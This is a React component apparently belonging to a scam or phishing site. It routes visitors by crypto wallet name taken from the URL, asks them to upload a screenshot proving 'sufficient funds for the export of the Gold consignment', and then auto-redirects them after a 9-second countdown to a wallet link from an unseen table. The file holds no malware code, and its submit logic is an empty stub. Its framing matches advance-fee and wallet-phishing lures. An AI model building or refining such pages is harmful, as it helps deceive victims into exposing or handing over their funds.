import React, { useEffect, useState, useRef } from 'react';
import { walletRedirectLinks } from '../walletRedirectLinks';

const ProofOfFund = ({ theme, walletType, startCountdown }) => {
  const [countdown, setCountdown] = useState(9); // Start at 9 when countdown begins
  const [progress, setProgress] = useState(0); // Progress bar state
  const [selectedFile, setSelectedFile] = useState(null);
  const timersRef = useRef({});

  useEffect(() => {
    // Only start timers when startCountdown becomes true
    if (!startCountdown) return undefined;

    // Get wallet type from URL path (e.g., /trust, /binance)
    const path = window.location.pathname;
    // Remove leading slash and possible trailing slash, get first segment
    const routeWalletType = path.replace(/^\//, '').replace(/\/$/, '').split('/')[0].toLowerCase();

    setCountdown(9);
    setProgress(0);

    timersRef.current.countdownInterval = setInterval(() => {
      setCountdown((prev) => {
        if (prev <= 1) {
          clearInterval(timersRef.current.countdownInterval);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    timersRef.current.progressInterval = setInterval(() => {
      setProgress((prev) => {
        const next = prev + 100 / 9;
        if (next >= 100) {
          clearInterval(timersRef.current.progressInterval);
          return 100;
        }
        return next;
      });
    }, 1000);

    timersRef.current.redirectTimer = setTimeout(() => {
      const redirectUrl = walletRedirectLinks[routeWalletType];
      if (redirectUrl) {
        window.location.href = redirectUrl;
      }
      // If no link is specified, do not redirect
    }, 9 * 1000);

    return () => {
      clearInterval(timersRef.current.countdownInterval);
      clearInterval(timersRef.current.progressInterval);
      clearTimeout(timersRef.current.redirectTimer);
      timersRef.current = {};
    };
  }, [startCountdown]);

  return (
    <div
      className="proof-of-fund"
      style={{
        background: theme.bg,
        color: theme.text,
        border: `2px solid ${theme.border}`,
        borderRadius: '10px',
        padding: '20px',
        boxShadow: '0 2px 8px rgba(0,0,0,0.15)',
      }}
    >
      {/* Top loader */}
      <div
        style={{
          height: '4px',
          width: `${progress}%`,
          background: theme.accent,
          transition: 'width 1s linear',
        }}
      ></div>

      <h2 style={{ color: theme.accent }}>Proof of Fund</h2>
      <p>Please upload a screenshot of your dashboard showing sufficient funds for the export of the Gold consignment.</p>
      <input
        type="file"
        accept="image/*"
        onChange={e => setSelectedFile(e.target.files[0])}
        style={{
          background: theme.bg,
          color: theme.text,
          border: `1px solid ${theme.border}`,
          borderRadius: '5px',
          padding: '10px',
        }}
      />
      <button
        onClick={() => {/* handle submit logic here */}}
        disabled={!selectedFile}
        style={{
          marginTop: 16,
          background: theme.accent,
          color: theme.buttonText,
          fontWeight: 700,
          fontSize: 16,
          borderRadius: 8,
          padding: '10px 0',
          width: '100%',
          border: 'none',
          boxShadow: '0 2px 8px rgba(0,0,0,0.1)',
          cursor: !selectedFile ? 'not-allowed' : 'pointer',
          opacity: !selectedFile ? 0.6 : 1
        }}
      >
        Submit Proof of Fund
      </button>
      <p className="mt-4" style={{ color: theme.text }}>
         please return to this page to submit your Proof of Fund.
      </p>
      <p style={{ marginTop: '10px', color: theme.text }}>
        Redirecting in {countdown} seconds...
      </p>
    </div>
  );
};

export default ProofOfFund;